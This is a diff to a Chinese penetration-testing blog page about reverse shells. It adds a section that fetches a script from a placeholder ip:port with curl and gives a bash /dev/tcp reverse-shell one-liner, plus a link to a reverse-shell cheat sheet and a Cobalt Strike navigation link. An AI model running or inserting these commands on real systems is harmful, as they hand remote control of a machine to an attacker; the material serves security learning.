@@ -146,11 +146,21 @@
 <blockquote>
 <p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p>
 </blockquote>
+<h3 id="使用外置bash连接"><a href="#使用外置bash连接" class="headerlink" title="使用外置bash连接"></a>使用外置bash连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip:port&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p>shell内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <p>参考连接</p>
 <p><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a></p>
 <p><a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/147768.html</a></p>
 <p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p>
 <p><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a></p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
 
       
       <!-- 打赏 -->
@@ -170,11 +180,11 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/03/12/Cobalt-Strike%E7%9A%84%E5%AE%89%E8%A3%85/" class="article-nav-link">
+      <a href="/2020/03/12/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Cobalt Strike的安装
+            Cobalt Strike的使用
           
         </div>
       </a>
